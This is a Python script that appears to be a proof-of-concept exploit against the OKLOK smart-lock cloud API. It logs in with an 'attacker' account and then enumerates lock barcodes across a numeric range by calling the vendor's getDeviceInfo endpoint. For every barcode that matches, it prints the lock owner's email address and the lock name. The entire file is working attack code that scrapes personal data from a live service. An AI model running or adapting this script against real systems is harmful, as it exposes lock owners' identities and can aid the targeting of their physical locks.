#!/usr/bin/env python3

import requests
import json
import sys
import getpass

def login_attacker(attacker_email_address, attacker_password):
		
	login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

	login_body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

	login_headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Content-Length': '70',
	'Accept-Encoding': 'gzip, deflate, br'}

	print('\n-------------------------------------------------------------')
	print('Logging in...')

	
	response = requests.post(login_url, data=json.dumps(login_body), headers=login_headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print('Login successful!\n')
		print('Login Details:')
		result = json_resp['result']
		attacker_token = result['token']
		attacker_userId = result['userId']
		print('attacker_token: ' + str(attacker_token))
		print('attacker_userId: ' + str(attacker_userId))
		print('-------------------------------------------------------------\n')
		return attacker_token

	else:
		sys.exit('Login not successful.')

def querydevice(start_range, end_range, attacker_token):

	prefix_choice = input('Choose a 4-char prefix: \n1. GFYY\n2. UBAN\n3. XBAN\n4. UFCY\n5. UFAY\n6. UBAY\n7. QBAN\n8. Other\n')

	other=''
	if prefix_choice == '8':
		other = input('\nEnter a 4-char prefix:\n')
		if len(other) != 4:
			sys.exit('Incorrect prefix length.')

	prefix = {1: 'GFYY', 2: 'UBAN', 3: 'XBAN', 4: 'UFCY', 5: 'UFAY', 6: 'UBAY', 7: 'QBAN', 8: other}
	if prefix_choice not in ('1', '2', '3', '4', '5', '6', '7', '8'):
		sys.exit('Invalid choice.')

	qd_url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'

	headers = {'Host': 'app.oklok.com.cn',
	'phoneModel': 'iPhone11,8',
	'Accept': '*/*',
	'appVersion': '3.1.1',
	'Accept-Language': 'en-US;q=1',
	'Accept-Encoding': 'gzip, deflate, br',
	'token': attacker_token,
	'Content-Type': 'application/json',
	'Content-Length': '26',
	'clientType': 'iOS',
	'language': 'en-US',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Connection': 'keep-alive',
	'osVersion': '13.3'}

	print('-------------------------------------------------------------')
	print('Querying devices by barcode...\n')

	for i in range(start_range, end_range):
		print('-------------------------------------------------------------')
		i = str(i).zfill(8)
		barcode = prefix.get(int(prefix_choice)) + i
		print(f'Trying barcode {barcode}...')
		qd_body = {"barcode":barcode}
		response = requests.post(qd_url, data=json.dumps(qd_body), headers=headers)
		json_resp = response.json()
		status = json_resp['status']
		result = json_resp['result']
		if status == '2000':
			if len(result)!=0:
				email_address = result['account']
				lock_name = result['name']
				print('email address: ' + str(email_address))
				print('lock name: ' + str(lock_name))
				print('-------------------------------------------------------------\n')
			else:
				print('No results found')
				print('-------------------------------------------------------------\n')
		else:
			print('HTTP Error - Device could not be queried.')
			print('-------------------------------------------------------------\n')


def main():

	if len(sys.argv) is not 4:
		sys.exit('Usage: python3 ownklok_barcode.py <start_of_range> <end_of_range> <attacker_email_address>')
	elif len(sys.argv[1]) > 8:
		sys.exit('Start of range has too many digits (must be <= 8).')
	elif len(sys.argv[2]) > 8:
		sys.exit('End of range has too many digits (must be <= 8).')
	elif int(sys.argv[2]) <= int(sys.argv[1]):
		sys.exit('Usage: python3 ownklok_barcode.py <start_of_range> <end_of_range> <attacker_email_address>. End of range must be greater than start of range.')
	elif int(sys.argv[1]) < 0:
		sys.exit('Usage: python3 ownklok_barcode.py <start_of_range> <end_of_range> <attacker_email_address>. Range cannot include negative numbers.')
	else:
		start_range = int(sys.argv[1])
		end_range = int(sys.argv[2])
		attacker_email_address = sys.argv[3]
		attacker_password = getpass.getpass('Attacker Password: ')

	attacker_token = login_attacker(attacker_email_address, attacker_password)

	querydevice(start_range, end_range, attacker_token)


if __name__ == '__main__':
	main()
